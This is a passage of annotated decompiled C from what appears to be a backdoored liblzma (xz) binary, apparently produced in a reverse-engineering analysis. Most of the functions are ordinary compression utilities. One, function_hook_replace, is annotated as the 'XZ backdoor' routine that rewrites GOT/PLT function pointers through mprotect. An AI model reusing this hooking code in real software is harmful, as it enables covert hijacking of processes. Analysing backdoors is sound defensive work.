                    /* WARNING: Does not return */
    pcVar2 = (code *)invalidInstructionException();
    (*pcVar2)();
  }
  puVar8 = (ulong *)0x0;
  do {
    while( true ) {
      puVar6 = puVar1;
      if (param_2 < *puVar6) break;
      puVar1 = (ulong *)puVar6[4];
      puVar8 = puVar6;
      if ((ulong *)puVar6[4] == (ulong *)0x0) goto LAB_00107390;
    }
    puVar1 = (ulong *)puVar6[3];
  } while ((ulong *)puVar6[3] != (ulong *)0x0);
LAB_00107390:
  puVar6 = (ulong *)0x0;
  puVar1 = (ulong *)puVar8[7];
  if ((ulong *)puVar8[7] == (ulong *)0x0) {
                    /* WARNING: Does not return */
    pcVar2 = (code *)invalidInstructionException();
    (*pcVar2)();
  }
  do {
    while( true ) {
      puVar3 = puVar1;
      if (param_2 - *puVar8 < *puVar3) break;
      puVar1 = (ulong *)puVar3[4];
      puVar6 = puVar3;
      if ((ulong *)puVar3[4] == (ulong *)0x0) goto LAB_001073d0;
    }
    puVar1 = (ulong *)puVar3[3];
  } while ((ulong *)puVar3[3] != (ulong *)0x0);
LAB_001073d0:
  uVar5 = 0;
  uVar4 = puVar6[7];
  while (uVar7 = uVar4, uVar5 < uVar7) {
    uVar4 = (uVar7 - uVar5 >> 1) + uVar5;
    if (puVar6[uVar4 * 2 + 8] <= param_2 - *puVar8) {
      uVar5 = uVar4 + 1;
      uVar4 = uVar7;
    }
  }
  *(ulong **)(param_1 + 0x108) = puVar8;
  *(ulong **)(param_1 + 0x110) = puVar6;
  *(ulong *)(param_1 + 0x118) = uVar5;
  FUN_00106320();
  return 0;
}



/**
 * @name  lzma_stream_flags_compare
 * @brief Compares two LZMA stream flag structures: validates presets, compares check types and backward sizes.
 * @confidence 92%
 * @classification utility
 * @address 0x00107440
 */

/* Compares two LZMA stream flag structures. Validates preset values < 0x10, compares presets and
   uncompressed sizes, checks alignment on sizes. */

undefined4 lzma_stream_flags_compare(int *param_1,int *param_2)

{
  long lVar1;
  long lVar2;
  undefined4 uVar3;
  
  uVar3 = 8;
  if (*param_1 == 0) {
    if (*param_2 != 0) {
      return 8;
    }
    if ((0xf < (uint)param_1[4]) || (0xf < (uint)param_2[4])) {
      return 0xb;
    }
    if (param_1[4] != param_2[4]) {
      return 9;
    }
    lVar1 = *(long *)(param_1 + 2);
    uVar3 = 0;
    if ((lVar1 != -1) && (lVar2 = *(long *)(param_2 + 2), lVar2 != -1)) {
      if (0x3fffffffc < lVar1 - 4U) {
        return 0xb;
      }
      if (0x3fffffffc < lVar2 - 4U) {
        return 0xb;
      }
      if ((((uint)lVar1 | (uint)lVar2) & 3) != 0) {
        return 0xb;
      }
      if (lVar1 != lVar2) {
        uVar3 = 9;
      }
    }
  }
  return uVar3;
}



/**
 * @name  lzma_str_validate_preset
 * @brief Validates LZMA preset string options, returns error message if lc+lp > 4
 * @confidence 75%
 * @classification utility
 * @address 0x00107a50
 */

/* Validates LZMA preset, returns error message if lc+lp > 4 */

char * lzma_str_validate_preset(undefined8 param_1,undefined8 param_2,long param_3)

{
  char *pcVar1;
  
  lzma_lzma_preset(param_3,6);
  pcVar1 = (char *)parse_lzma_options_string(param_1,param_2,param_3,"preset",9);
  if ((pcVar1 == (char *)0x0) && (4 < (uint)(*(int *)(param_3 + 0x18) + *(int *)(param_3 + 0x14))))
  {
    pcVar1 = "The sum of lc and lp must not exceed 4";
  }
  return pcVar1;
}



/**
 * @name  get_memory_permissions
 * @brief Reads /proc/self/maps to find memory region containing address, returns permission bitmask (1=r, 2=w, 4=x).
 * @confidence 88%
 * @classification utility
 * @address 0x00108950
 */

/* Reads /proc/self/maps to find the memory region containing the given address and returns a
   bitmask of permissions (1=read, 2=write, 4=execute) */

byte get_memory_permissions(ulong param_1)

{
  int iVar1;
  FILE *__stream;
  char *pcVar2;
  byte bVar3;
  long in_FS_OFFSET;
  bool bVar4;
  ulong local_1060;
  ulong local_1058;
  char local_104d;
  char local_104c;
  char local_104b;
  char local_104a;
  char local_1049;
  char local_1048 [4104];
  long local_40;
  
  local_40 = *(long *)(in_FS_OFFSET + 0x28);
  __stream = fopen("/proc/self/maps","r");
  bVar4 = true;
  if (__stream == (FILE *)0x0) {
    bVar3 = 0;
    format_error_message("failed to open /proc/self/maps");
    goto LAB_00108a4c;
  }
  do {
    while( true ) {
      bVar3 = bVar4;
      pcVar2 = fgets(local_1048,0x1000,__stream);
      if (pcVar2 == (char *)0x0) {
        bVar3 = 0;
        fclose(__stream);
        format_error_message("Could not find memory region containing %p",param_1);
        goto LAB_00108a4c;
      }
      pcVar2 = strchr(local_1048,10);
      if ((bool)bVar3 != false) break;
      bVar4 = pcVar2 != (char *)0x0;
    }
    bVar4 = pcVar2 != (char *)0x0;
    iVar1 = __isoc99_sscanf(local_1048,"%lx-%lx %4s",&local_1060,&local_1058,&local_104d);
  } while (((iVar1 != 3) || (param_1 < local_1060)) || (local_1058 <= param_1));
  if (local_104d == 'r') {
LAB_00108abc:
    if (local_104c == 'w') {
      bVar3 = bVar3 | 2;
    }
    else if (local_104c != '-') goto LAB_00108a85;
    if (local_104b == 'x') {
      bVar3 = bVar3 | 4;
    }
    else if (local_104b != '-') goto LAB_00108a85;
    if (local_104a == 'p') {
      if (local_1049 == '\0') {
        fclose(__stream);
        goto LAB_00108a4c;
      }
      local_1049 = '\0';
    }
  }
  else if (local_104d == '-') {
    bVar3 = false;
    goto LAB_00108abc;
  }
LAB_00108a85:
  bVar3 = 0;
  fclose(__stream);
  format_error_message("Unexcepted memory permission %s at %p",&local_104d,param_1);
LAB_00108a4c:
  if (local_40 != *(long *)(in_FS_OFFSET + 0x28)) {
                    /* WARNING: Subroutine does not return */
    __stack_chk_fail();
  }
  return bVar3;
}



/**
 * @name  lzma_get_dlinfo
 * @brief Retrieves dynamic library link map via dlinfo() and parses ELF dynamic section.
 * @confidence 82%
 * @classification utility
 * @address 0x00108fa0
 */

/* Retrieves dynamic library information and processes it. Calls dlinfo() system function to extract
   library data and passes results to further processing. Includes stack canary check. */

undefined8 lzma_get_dlinfo(undefined8 param_1,long param_2)

{
  int iVar1;
  undefined8 uVar2;
  long in_FS_OFFSET;
  long local_18;
  long local_10;
  
  local_10 = *(long *)(in_FS_OFFSET + 0x28);
  local_18 = 0;
  if (param_2 == 0) {
    format_error_message("NULL handle");
    uVar2 = 1;
  }
  else {
    iVar1 = dlinfo(param_2,2,&local_18);
    if (iVar1 == 0) {
      uVar2 = parse_elf_dynamic_section(param_1,local_18,local_18 + 0x10);
    }
    else {
      format_error_message("dlinfo error");
      uVar2 = 1;
    }
  }
  if (local_10 == *(long *)(in_FS_OFFSET + 0x28)) {
    return uVar2;
  }
                    /* WARNING: Subroutine does not return */
  __stack_chk_fail();
}



/**
 * @name  resolve_symbol_from_address
 * @brief Resolves dynamic symbol info from a code address using dladdr1, then parses the library's ELF dynamic section.
 * @confidence 82%
 * @classification utility
 * @address 0x00109040
 */

/* Resolves dynamic symbol information from a code address. Uses dladdr1 to locate library and
   symbol information, then parses the library's symbol table. */

undefined8 resolve_symbol_from_address(undefined8 *param_1,undefined8 param_2)

{
  int iVar1;
  undefined8 uVar2;
  long in_FS_OFFSET;
  long local_40;
  undefined1 local_38 [40];
  long local_10;
  
  local_10 = *(long *)(in_FS_OFFSET + 0x28);
  *param_1 = 0;
  local_40 = 0;
  iVar1 = dladdr1(param_2,local_38,&local_40,2);
  if (iVar1 == 0) {
    format_error_message("dladdr error");
    uVar2 = 1;
  }
  else {
    uVar2 = parse_elf_dynamic_section(param_1,local_40,local_40 + 0x10);
  }
  if (local_10 == *(long *)(in_FS_OFFSET + 0x28)) {
    return uVar2;
  }
                    /* WARNING: Subroutine does not return */
  __stack_chk_fail();
}



/**
 * @name  function_hook_replace
 * @brief XZ backdoor: replaces a function pointer in GOT/PLT by name. Changes memory protection, swaps pointer, restores protection.
 * @confidence 90%
 * @classification utility
 * @address 0x001091b0
 */

/* Replaces a function pointer in a loaded module's GOT/PLT by name. Finds the function entry via
   symbol table lookup, changes memory protection if needed, swaps the pointer, and restores
   original protection. Returns 0 on success, error codes otherwise. */

int function_hook_replace(long param_1,char *param_2,undefined8 param_3,undefined8 *param_4)

{
  int iVar1;
  uint __prot;
  size_t sVar2;
  int *piVar3;
  char *pcVar4;
  ulong uVar5;
  long in_FS_OFFSET;
  undefined4 local_54;
  char *local_50;
  undefined8 *local_48;
  long local_40;
  
  local_40 = *(long *)(in_FS_OFFSET + 0x28);
  sVar2 = strlen(param_2);
  local_54 = 0;
  if (param_1 == 0) {
    format_error_message("invalid argument: The first argument is null.");
    iVar1 = 4;
  }
  else {
    do {
      iVar1 = find_section_header_strtab(param_1,&local_54,&local_50,&local_48);
      pcVar4 = local_50;
      if (iVar1 != 0) {
        if (iVar1 == -1) {
          format_error_message("no such function: %s",param_2);
          iVar1 = 3;
        }
        goto LAB_001092a9;
      }
      iVar1 = strncmp(local_50,param_2,sVar2);
    } while ((iVar1 != 0) || ((pcVar4[sVar2] & 0xbfU) != 0));
    __prot = get_memory_permissions(local_48);
    sVar2 = system_page_size;
    iVar1 = 6;
    if (__prot != 0) {
      if ((__prot & 2) == 0) {
        uVar5 = -system_page_size;
        iVar1 = mprotect((void *)((ulong)local_48 & uVar5),system_page_size,3);
        if (iVar1 == 0) {
          if (param_4 != (undefined8 *)0x0) {
            *param_4 = *local_48;
          }
          *local_48 = param_3;
          mprotect((void *)(uVar5 & (ulong)local_48),sVar2,__prot);
          iVar1 = 0;
        }
        else {
          piVar3 = __errno_location();
          pcVar4 = strerror(*piVar3);
          format_error_message
                    ("Could not change the process memory permission at %p: %s",
                     uVar5 & (ulong)local_48,pcVar4);
          iVar1 = 6;
        }
      }
      else {
        if (param_4 != (undefined8 *)0x0) {
          *param_4 = *local_48;
        }
        *local_48 = param_3;
        iVar1 = 0;
      }
    }
  }
LAB_001092a9:
  if (local_40 != *(long *)(in_FS_OFFSET + 0x28)) {
                    /* WARNING: Subroutine does not return */
    __stack_chk_fail();
  }
  return iVar1;
}



/**
 * @name  lzma_vli_size
 * @brief Counts bytes needed for variable-length integer encoding (7 bits per byte)
 * @confidence 90%
 * @classification utility
 * @address 0x001093d0
 */

/* Counts bytes needed for VLI encoding by shifting right 7 bits per iteration */

void lzma_vli_size(ulong param_1)

{
  if (-1 < (long)param_1) {
    do {
      param_1 = param_1 >> 7;
    } while (param_1 != 0);
  }
  return;
}



/**
 * @name  lzma_outq_memusage
 * @brief Calculates output queue memory usage as (count*2)*(buf_size+0x40)
 * @confidence 85%
 * @classification utility
 * @address 0x00109a40
 */

/* Calculates output queue memory usage as (count*2)*(buf_size+0x40) */

long lzma_outq_memusage(ulong param_1,uint param_2)

{
  if ((param_2 < 0x4001) && (param_1 < 0x1000000000000)) {
    return (ulong)(param_2 * 2) * (param_1 + 0x40);
  }
  return -1;
}



/**
 * @name  lzma_outq_has_output
 * @brief Checks if output queue has data available for reading
 * @confidence 80%
 * @classification utility
 * @address 0x00109d30
 */

/* Checks if output queue has data available */

undefined1 lzma_outq_has_output(long *param_1)

{
  long lVar1;
  
  lVar1 = *param_1;
  if (lVar1 == 0) {
    return 0;
  }
  if ((ulong)param_1[2] < *(ulong *)(lVar1 + 0x18)) {
    return 1;
  }
  return *(undefined1 *)(lVar1 + 0x28);
}



/**
 * @name  lzma_block_compress_bound
 * @brief Calculates maximum compressed size with 3-byte overhead per 64K block plus 1
 * @confidence 85%
 * @classification utility
 * @address 0x0010a180
 */

/* Calculates max compressed size with per-64K overhead */

long lzma_block_compress_bound(ulong param_1)

{
  long lVar1;
  long lVar2;
  
  lVar1 = (param_1 + 0xffff >> 0x10) * 3 + 1;
  lVar2 = lVar1 + param_1;
  if (0x7ffffffffffffbbcU - lVar1 < param_1) {
    lVar2 = 0;
  }
  return lVar2;
}



/**
 * @name  lzma_block_buffer_bound_internal
 * @brief Internal block buffer bound calculation, same logic as public version
 * @confidence 75%
 * @classification utility
 * @address 0x0010a730
 */

/* Internal block buffer bound calculation with CRC overhead */

long lzma_block_buffer_bound_internal(ulong param_1)

{
  long lVar1;
  long lVar2;
  
  lVar2 = 0;
  if (param_1 < 0x7ffffffffffffbbd) {
    lVar1 = lzma_block_compress_bound();
    lVar2 = 0;
    if (lVar1 != 0) {
      lVar2 = (lVar1 + 3U & 0xfffffffffffffffc) + 0x5c;
    }
  }
  return lVar2;
}



/**
 * @name  lzma_block_buffer_bound
 * @brief Returns maximum buffer size for LZMA block compression including headers
 * @confidence 90%
 * @classification utility
 * @address 0x0010a760
 */

/* Returns maximum output buffer size for LZMA block compression */

long lzma_block_buffer_bound(ulong param_1)

{
  long lVar1;
  long lVar2;
  
  lVar2 = 0;
  if (param_1 < 0x7ffffffffffffbbd) {
    lVar1 = lzma_block_compress_bound();
    lVar2 = 0;
    if (lVar1 != 0) {
      lVar2 = (lVar1 + 3U & 0xfffffffffffffffc) + 0x5c;
    }
  }
  return lVar2;
}



/**
 * @name  lzma_block_header_size
 * @brief Calculates block header size by summing VLI sizes, filter flag sizes, and padding to 4-byte alignment.
 * @confidence 90%
 * @classification utility
 * @address 0x0010ac20
 */

/* Calculates LZMA block header size by summing VLI, filter sizes, and padding, validates structure
   and bounds */

undefined8 lzma_block_header_size(uint *param_1)

{
  int iVar1;
  undefined8 uVar2;
  int iVar3;
  long lVar4;
  long in_FS_OFFSET;
  int local_34;
  long local_30;
  
  local_30 = *(long *)(in_FS_OFFSET + 0x28);
  uVar2 = 8;
  if (1 < *param_1) goto LAB_0010acd3;
  lVar4 = *(long *)(param_1 + 4);
  if (lVar4 == -1) {
    iVar3 = 6;
LAB_0010ac71:
    if (*(long *)(param_1 + 6) != -1) {
      iVar1 = lzma_vli_size();
      uVar2 = 0xb;
      if (iVar1 == 0) goto LAB_0010acd3;
      iVar3 = iVar3 + iVar1;
    }
    if ((*(long **)(param_1 + 8) != (long *)0x0) && (**(long **)(param_1 + 8) != -1)) {
      lVar4 = 0x10;
      do {
        uVar2 = lzma_filter_flags_size(&local_34);
        if ((int)uVar2 != 0) goto LAB_0010acd3;
        iVar3 = iVar3 + local_34;
        if (*(long *)(*(long *)(param_1 + 8) + lVar4) == -1) {
          param_1[1] = iVar3 + 3U & 0xfffffffc;
          goto LAB_0010acd3;
        }
        lVar4 = lVar4 + 0x10;
      } while (lVar4 != 0x50);
    }
  }
  else {
    iVar1 = lzma_vli_size(lVar4);
    if ((lVar4 != 0) && (iVar3 = iVar1 + 6, iVar1 != 0)) goto LAB_0010ac71;
  }
  uVar2 = 0xb;
LAB_0010acd3:
  if (local_30 == *(long *)(in_FS_OFFSET + 0x28)) {
    return uVar2;
  }
                    /* WARNING: Subroutine does not return */
  __stack_chk_fail();
}



/**
 * @name  lzma_encoder_find_by_id
 * @brief Searches encoder filter table (12 entries) for matching filter ID, returns descriptor
 * @confidence 85%
 * @classification utility
 * @address 0x0010b1c0
 */

/* Searches encoder filter table (12 entries) for matching ID */

undefined * lzma_encoder_find_by_id(long param_1)

{
  long lVar1;
  long lVar2;
  long *plVar3;
  
  plVar3 = &encoder_filter_table;
  lVar1 = 0;
  lVar2 = 0x4000000000000001;
  while( true ) {
    if (param_1 == lVar2) {
      return &DAT_00131980 + lVar1 * 0x38;
    }
    lVar1 = lVar1 + 1;
    if (lVar1 == 0xc) break;
    lVar2 = *plVar3;
    plVar3 = plVar3 + 7;
  }
  return (undefined *)0x0;
}



/**
 * @name  lzma_filter_encoder_is_supported
 * @brief Checks if filter ID exists in encoder filter table (12 entries)
 * @confidence 90%
 * @classification utility
 * @address 0x0010b220
 */

/* Checks if filter ID is in encoder filter table (12 entries) */

undefined8 lzma_filter_encoder_is_supported(long param_1)

{
  long lVar1;
  long lVar2;
  long *plVar3;
  
  plVar3 = &encoder_filter_table;
  lVar1 = 0;
  lVar2 = 0x4000000000000001;
  while( true ) {
    if (param_1 == lVar2) {
      return 1;
    }
    lVar1 = lVar1 + 1;
    if (lVar1 == 0xc) break;
    lVar2 = *plVar3;
    plVar3 = plVar3 + 7;
  }
  return 0;
}



/**
 * @name  lzma_raw_encoder_memusage
 * @brief Queries memory usage for raw LZMA encoding using encoder filter lookup
 * @confidence 85%
 * @classification utility
 * @address 0x0010b310
 */

/* Queries memory usage for raw LZMA encoding */

void lzma_raw_encoder_memusage(undefined8 param_1)

{
  FUN_00105fb0(lzma_encoder_find_by_id,param_1);
  return;
}



/**
 * @name  lzma_filters_update
 * @brief Updates filter chain: validates memory usage, reverses filter array, calls coder's update function.
 * @confidence 88%
 * @classification utility
 * @address 0x0010b330
 */

/* Updates the filter chain in an LZMA stream. Validates memory usage via lzma_raw_encoder_memusage,
   reverses the filter array order into a local buffer, then calls the coder's update function.
   Returns LZMA_PROG_ERROR (0xb) if no update function, LZMA_MEM_ERROR (8) if memusage check fails.
    */

undefined8 lzma_filters_update(long param_1,undefined8 *param_2)

{
  undefined8 *puVar1;
  code *pcVar2;
  undefined8 uVar3;
  long lVar4;
  long lVar5;
  undefined8 uVar6;
  undefined8 *puVar7;
  undefined8 *puVar8;
  long in_FS_OFFSET;
  undefined8 local_88 [11];
  long local_30;
  
  puVar1 = *(undefined8 **)(param_1 + 0x38);
  local_30 = *(long *)(in_FS_OFFSET + 0x28);
  pcVar2 = (code *)puVar1[8];
  if (pcVar2 == (code *)0x0) {
    uVar6 = 0xb;
  }
  else {
    lVar4 = lzma_raw_encoder_memusage(param_2);
    if (lVar4 == -1) {
      uVar6 = 8;
    }
    else {
      if (param_2[2] == -1) {
        local_88[0] = *param_2;
        local_88[1] = param_2[1];
        lVar4 = 1;
      }
      else {
        lVar4 = 1;
        do {
          lVar5 = lVar4;
          lVar4 = lVar5 + 1;
        } while (param_2[lVar4 * 2] != -1);
        puVar7 = local_88 + lVar5 * 2;
        puVar8 = param_2;
        do {
          uVar6 = *puVar8;
          uVar3 = puVar8[1];
          puVar8 = puVar8 + 2;
          *puVar7 = uVar6;
          puVar7[1] = uVar3;
          puVar7 = puVar7 - 2;
        } while (puVar8 != param_2 + lVar4 * 2);
      }
      uVar6 = *(undefined8 *)(param_1 + 0x30);
      uVar3 = *puVar1;
      local_88[lVar4 * 2] = 0xffffffffffffffff;
      uVar6 = (*pcVar2)(uVar3,uVar6,param_2,local_88);
    }
  }
  if (local_30 == *(long *)(in_FS_OFFSET + 0x28)) {
    return uVar6;
  }
                    /* WARNING: Subroutine does not return */
  __stack_chk_fail();
}



/**
 * @name  lzma_mt_block_size
 * @brief Computes MT block size by iterating filters and finding the maximum recommended block size.
 * @confidence 80%
 * @classification utility
 * @address 0x0010b440
 */

ulong lzma_mt_block_size(long *param_1)

{
  long lVar1;
  ulong uVar2;
  long lVar3;
  long *plVar4;
  long lVar5;
  ulong uVar6;
  
  if ((param_1 != (long *)0x0) && (lVar5 = *param_1, lVar5 != -1)) {
    uVar6 = 0;
    do {
      lVar1 = 0;
      lVar3 = 0x4000000000000001;
      plVar4 = &encoder_filter_table;
      while (lVar5 != lVar3) {
        lVar1 = lVar1 + 1;
        if (lVar1 == 0xc) {
          return 0xffffffffffffffff;
        }
        lVar3 = *plVar4;
        plVar4 = plVar4 + 7;
      }
      if ((*(code **)(&UNK_00131998 + lVar1 * 0x38) != (code *)0x0) &&
         (uVar2 = (**(code **)(&UNK_00131998 + lVar1 * 0x38))(param_1[1]), uVar6 < uVar2)) {
        uVar6 = uVar2;
      }
      lVar5 = param_1[2];
      param_1 = param_1 + 2;
    } while (lVar5 != -1);
    if (uVar6 != 0) {
      return uVar6;
    }
  }
  return 0xffffffffffffffff;
}



/**
 * @name  lzma_properties_size
 * @brief Determines property size for an LZMA filter by searching filter table and calling size handler or returning default.
 * @confidence 90%
 * @classification utility
 * @address 0x0010b510
 */

/* Determines property size for LZMA filter by searching filter table and calling handler or
   returning default */

ulong lzma_properties_size(undefined4 *param_1,long *param_2)

{
  long lVar1;
  ulong uVar2;
  long lVar3;
  long *plVar4;
  
  plVar4 = &encoder_filter_table;
  lVar1 = 0;
  lVar3 = 0x4000000000000001;
  while( true ) {
    if (*param_2 == lVar3) {
      if (*(code **)(&UNK_001319a0 + lVar1 * 0x38) != (code *)0x0) {
                    /* WARNING: Could not recover jumptable at 0x0010b57e. Too many branches */
                    /* WARNING: Treating indirect jump as call */
        uVar2 = (**(code **)(&UNK_001319a0 + lVar1 * 0x38))(param_1,param_2[1]);
        return uVar2;
      }
      *param_1 = *(undefined4 *)(&UNK_001319a8 + lVar1 * 0x38);
      return 0;
    }
    lVar1 = lVar1 + 1;
    if (lVar1 == 0xc) break;
    lVar3 = *plVar4;
    plVar4 = plVar4 + 7;
  }
  return (ulong)(((uint)(*param_2 >> 0x3f) & 3) + 8);
}



/**
 * @name  lzma_filter_flags_size
 * @brief Calculates encoded size of filter flags including VLI-encoded ID and properties size
 * @confidence 85%
 * @classification utility
 * @address 0x0010b600
 */

/* Calculates encoded size of filter flags */

int lzma_filter_flags_size(int *param_1,ulong *param_2)

{
  int iVar1;
  int iVar2;
  int iVar3;
  int iVar4;
  
  iVar2 = 0xb;
  if (*param_2 < 0x4000000000000000) {
    iVar2 = lzma_properties_size();
    if (iVar2 == 0) {
      iVar1 = *param_1;
      iVar3 = lzma_vli_size(*param_2);
      iVar4 = lzma_vli_size(iVar1);
      *param_1 = iVar3 + iVar4 + iVar1;
    }
  }
  return iVar2;
}



/**
 * @name  lzma_stream_buffer_bound
 * @brief Returns maximum output size for stream buffer compression (block bound + 0x30 for headers/footer)
 * @confidence 90%
 * @classification utility
 * @address 0x0010bc30
 */

/* Returns max output size for stream compression (block bound + 0x30) */

long lzma_stream_buffer_bound(void)

{
  long lVar1;
  ulong uVar2;
  
  lVar1 = lzma_block_buffer_bound();
  if ((lVar1 != 0) && (uVar2 = 0x7fffffffffffffff - lVar1, lVar1 = lVar1 + 0x30, uVar2 < 0x30)) {
    lVar1 = 0;
  }
  return lVar1;
}



/**
 * @name  lzma_stream_encoder_mt_get_progress
 * @brief Collects progress from MT encoder by summing per-worker in/out byte counts under mutex protection.
 * @confidence 75%
 * @classification utility
 * @address 0x0010c8c0
 */

void FUN_0010c8c0(long param_1,long *param_2,long *param_3)

{
  long lVar1;
  long lVar2;
  ulong uVar3;
  
  pthread_mutex_lock((pthread_mutex_t *)(param_1 + 0x1d8));
  *param_2 = *(long *)(param_1 + 0x1c8);
  *param_3 = *(long *)(param_1 + 0x1d0);
  if (*(int *)(param_1 + 0x1b4) != 0) {
    lVar2 = 0;
    uVar3 = 0;
    do {
      uVar3 = uVar3 + 1;
      pthread_mutex_lock((pthread_mutex_t *)(*(long *)(param_1 + 0x1a8) + lVar2 + 0x1b8));
      lVar1 = *(long *)(param_1 + 0x1a8) + lVar2;
      lVar2 = lVar2 + 0x220;
      *param_2 = *param_2 + *(long *)(lVar1 + 0x30);
      *param_3 = *param_3 + *(long *)(lVar1 + 0x38);
      pthread_mutex_unlock((pthread_mutex_t *)(lVar1 + 0x1b8));
    } while (uVar3 < *(uint *)(param_1 + 0x1b4));
  }
  pthread_mutex_unlock((pthread_mutex_t *)(param_1 + 0x1d8));
  return;
}



/**
 * @name  lzma_encoder_set_filters
 * @brief Configures LZMA encoder filters by validating memory usage, copying filter array, and freeing old filters.
 * @confidence 80%
 * @classification utility
 * @address 0x0010c980
 */

/* Configures LZMA encoder filters by copying filter array, freeing old filters, and validating
   state requirements */

ulong lzma_encoder_set_filters(uint *param_1,undefined8 param_2,undefined8 param_3)

{
  ulong uVar1;
  long lVar2;
  long in_FS_OFFSET;
  undefined8 local_78;
  undefined8 uStack_70;
  undefined8 local_68;
  undefined8 uStack_60;
  undefined8 local_58;
  undefined8 uStack_50;
  undefined8 local_48;
  undefined8 uStack_40;
  undefined8 local_38;
  undefined8 uStack_30;
  long local_20;
  
  local_20 = *(long *)(in_FS_OFFSET + 0x28);
  uVar1 = 0xb;
  if ((*param_1 < 2) && (*(long *)(param_1 + 0x70) == 0)) {
    lVar2 = lzma_raw_encoder_memusage(param_3);
    uVar1 = 8;
    if ((lVar2 != -1) && (uVar1 = lzma_filters_copy(param_3,&local_78,param_2), (int)uVar1 == 0)) {
      lzma_filters_free(param_1 + 4,param_2);
      lzma_filters_free(param_1 + 0x18,param_2);
      uVar1 = uVar1 & 0xffffffff;
      *(undefined8 *)(param_1 + 4) = local_78;
      *(undefined8 *)(param_1 + 6) = uStack_70;
      *(undefined8 *)(param_1 + 8) = local_68;
      *(undefined8 *)(param_1 + 10) = uStack_60;
      *(undefined8 *)(param_1 + 0xc) = local_58;
      *(undefined8 *)(param_1 + 0xe) = uStack_50;
      *(undefined8 *)(param_1 + 0x10) = local_48;
      *(undefined8 *)(param_1 + 0x12) = uStack_40;
      *(undefined8 *)(param_1 + 0x14) = local_38;
      *(undefined8 *)(param_1 + 0x16) = uStack_30;
    }
  }
  if (local_20 != *(long *)(in_FS_OFFSET + 0x28)) {
                    /* WARNING: Subroutine does not return */
    __stack_chk_fail();
  }
  return uVar1;
}



/**
 * @name  lzma_mt_block_params_validate
 * @brief Validates MT block parameters: checks bounds, optionally initializes preset, calculates block and buffer sizes.
 * @confidence 78%
 * @classification utility
 * @address 0x0010d060
 */

/* Validates multi-threaded LZMA block parameters by checking bounds, initializing preset if needed,
   and calculating block/buffer sizes */

undefined4
lzma_mt_block_params_validate(int *param_1,long param_2,long *param_3,ulong *param_4,long *param_5)

{
  undefined4 uVar1;
  char cVar2;
  long lVar3;
  ulong uVar4;
  
  if (param_1 == (int *)0x0) {
    return 0xb;
  }
  if ((*param_1 == 0) && (param_1[1] - 1U < 0x4000)) {
    if (*(long *)(param_1 + 6) == 0) {
      cVar2 = lzma_easy_preset(param_2,param_1[5]);
      if (cVar2 != '\0') {
        return 8;
      }
      *param_3 = param_2;
    }
    else {
      *param_3 = *(long *)(param_1 + 6);
    }
    uVar4 = *(ulong *)(param_1 + 2);
    if (uVar4 == 0) {
      uVar4 = lzma_mt_block_size(*param_3);
    }
    *param_4 = uVar4;
    if (uVar4 < 0x4000000000000) {
      lVar3 = lzma_block_buffer_bound_internal();
      *param_5 = lVar3;
      uVar1 = 0;
      if (lVar3 == 0) {
        uVar1 = 5;
      }
      return uVar1;
    }
  }
  return 8;
}



/**
 * @name  lzma_lzma2_decoder_memconfig
 * @brief Gets/sets LZMA2 decoder memory limit at offsets 0x68 and 0x70
 * @confidence 80%
 * @classification utility
 * @address 0x0010e660
 */

/* Gets/sets LZMA2 decoder memory limit */

undefined8
lzma_lzma2_decoder_memlimit(long param_1,undefined8 *param_2,undefined8 *param_3,ulong param_4)

{
  undefined8 uVar1;
  
  *param_2 = *(undefined8 *)(param_1 + 0x70);
  *param_3 = *(undefined8 *)(param_1 + 0x68);
  uVar1 = 0;
  if ((param_4 != 0) && (uVar1 = 6, *(ulong *)(param_1 + 0x70) <= param_4)) {
    *(ulong *)(param_1 + 0x68) = param_4;
    uVar1 = 0;
  }
  return uVar1;
}



/**
 * @name  lzma_simple_coder_get_check
 * @brief Delegates get_check to sub-coder via function pointer at coder[6]
 * @confidence 75%
 * @classification utility
 * @address 0x0010eaf0
 */

/* Calls function pointer at coder[6] if non-null */

undefined8 lzma_simple_coder_get_check(undefined8 *param_1)

{
  undefined8 uVar1;
  
  if ((code *)param_1[6] != (code *)0x0) {
                    /* WARNING: Could not recover jumptable at 0x0010eb00. Too many branches */
                    /* WARNING: Treating indirect jump as call */
    uVar1 = (*(code *)param_1[6])(*param_1);
    return uVar1;
  }
  return 0;
}



/**
 * @name  lzma_stream_decoder_memconfig
 * @brief Validates encoder initialization state, queries/sets memory limit. Returns 0 on success, 6 if limit too small.
 * @confidence 70%
 * @classification utility
 * @address 0x0010eb10
 */

/* Validates encoder initialization state and output buffer capacity. Returns 0 on success, 6 if
   buffer is too small, or a status code from a check function at [7] */

undefined8
validate_encoder_state(undefined8 *param_1,ulong *param_2,undefined8 *param_3,ulong param_4)

{
  undefined8 uVar1;
  
  if ((code *)param_1[7] == (code *)0x0) {
    *param_2 = 0x8000;
    *param_3 = param_1[10];
    if (param_4 == 0) {
      return 0;
    }
    if (param_4 < *param_2) {
      return 6;
    }
  }
  else {
    uVar1 = (*(code *)param_1[7])(*param_1);
    if ((int)uVar1 != 0) {
      return uVar1;
    }
    if (param_4 == 0) {
      return uVar1;
    }
  }
  param_1[10] = param_4;
  return 0;
}



/**
 * @name  lzma_lz_encoder_prepare
 * @brief Manages LZ encoder buffer positioning: validates bounds, updates read position, handles buffer wraparound.
 * @confidence 60%
 * @classification utility
 * @address 0x0010f810
 */

/* Manages LZ77 buffer flushing with position tracking. Validates flushing position within
   write/output limits, updates state or stores in auxiliary buffer. */

undefined8 lzma_lz_flush(long param_1,long param_2,long *param_3,long param_4)

{
  ulong uVar1;
  long lVar2;
  long lVar3;
  undefined8 uVar4;
  ulong uVar5;
  ulong uVar6;
  
  uVar1 = *(ulong *)(param_1 + 0x10);
  uVar4 = 9;
  if (0x17 < uVar1) {
    uVar6 = uVar1 - 0xc;
    uVar5 = 0xc;
    *(undefined8 *)(param_1 + 0x150) = 0;
    if (0x1fff < uVar6) {
      uVar5 = uVar1 - 0x2000;
      uVar6 = 0x2000;
    }
    *(ulong *)(param_1 + 0x158) = uVar6;
    lVar2 = *param_3;
    lVar3 = *(long *)(param_1 + 8);
    if (((ulong)((param_2 - lVar2) + lVar3) <= uVar5) &&
       (uVar5 <= (ulong)((param_4 - lVar2) + lVar3))) {
      *param_3 = (lVar2 - lVar3) + uVar5;
      *(ulong *)(param_1 + 8) = uVar5;
      return 0;
    }
    **(ulong **)(param_1 + 0x98) = uVar5;
    *param_3 = param_4;
    *(ulong *)(param_1 + 8) = uVar5;
    uVar4 = 0xc;
  }
  return uVar4;
}



/**
 * @name  lzma_file_info_decoder_memconfig
